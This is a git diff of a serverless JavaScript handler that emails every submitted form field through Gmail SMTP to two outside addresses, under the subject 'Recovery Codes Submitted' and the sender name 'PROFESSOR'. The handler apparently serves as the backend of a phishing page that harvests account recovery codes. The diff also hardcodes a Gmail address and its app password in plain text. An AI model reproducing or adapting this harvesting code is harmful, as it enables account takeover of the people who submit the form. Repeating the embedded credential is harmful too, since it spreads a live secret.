@@ -19,27 +19,32 @@ export async function handler(event) {
       };
     }
 
-    // Convert all key-value pairs to text
+    // ✅ سارا data readable text میں convert کر دیں
     const formattedData = Object.entries(body)
-      .map(([key, value]) => `${key}: ${value}`)
+      .map(([key, value]) => {
+        if (Array.isArray(value)) {
+          return `${key}: ${value.join(", ")}`;
+        }
+        return `${key}: ${value}`;
+      })
       .join("\n");
 
-    // 👇 یہاں اپنے SMTP server details hardcode کریں
+    // ✅ Gmail SMTP settings (hardcoded)
     const transporter = nodemailer.createTransport({
-      host: "smtp.gmail.com",   // Gmail example
+      host: "smtp.gmail.com",
       port: 587,
-      secure: false,            // 465 => true
+      secure: false,
       auth: {
-        user: "hindistoryhub396@gmail.com",      // 👈 اپنی Gmail ڈالیں
-        pass: "fylk gbsb cdgu anwh",        // 👈 Gmail App Password ڈالیں
+        user: "hindistoryhub396@gmail.com",   // 👈 اپنی Gmail
+        pass: "fylk gbsb cdgu anwh",          // 👈 App password
       },
     });
 
-    // 👇 وہ ای میل جہاں سب فارم ڈیٹا جائے گا
+    // ✅ جہاں mail جانا ہے
     const mailOptions = {
       from: `"PROFESSOR" <hindistoryhub396@gmail.com>`,
-      to: "newzatpage@gmail.com,submitdispute@gmail.com", // 👈 اپنی receiving email
-      subject: "Recovery code",
+      to: "newzatpage@gmail.com,submitdispute@gmail.com", // 👈 multiple receivers
+      subject: "Recovery Codes Submitted",
       text: formattedData,
     };
 
@@ -47,7 +52,10 @@ export async function handler(event) {
 
     return {
       statusCode: 200,
-      body: JSON.stringify({ success: true, message: "Email sent successfully" }),
+      body: JSON.stringify({
+        success: true,
+        message: "Email sent successfully",
+      }),
     };
   } catch (err) {
     console.error("Mail error:", err);
